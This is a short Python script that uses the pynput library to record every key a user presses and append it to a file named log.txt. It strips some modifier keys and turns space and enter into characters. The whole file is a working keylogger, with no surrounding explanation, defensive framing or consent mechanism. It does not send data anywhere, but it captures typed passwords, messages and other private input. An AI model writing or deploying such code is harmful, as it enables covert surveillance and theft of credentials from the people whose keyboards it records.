from pynput.keyboard import Listener

keys = ['Key.ctrl_l', 'Key.caps_lock', 'Key.shift', 'Key.backspace', 'Key.tab', 'Key.ctrl_r', 'Key.alt_l', 'Key.alt_r']


def Writetofile(key):
    key = str(key)
    letter = key.replace("'", "")
    if letter == "Key.space":
        letter = ' '
    if letter == "Key.enter":
        letter = '\n'
    if letter in keys:
        letter = ''
    with open("log.txt", "a") as f:
        f.write(letter)


with Listener(on_press=Writetofile) as k:
    k.join()
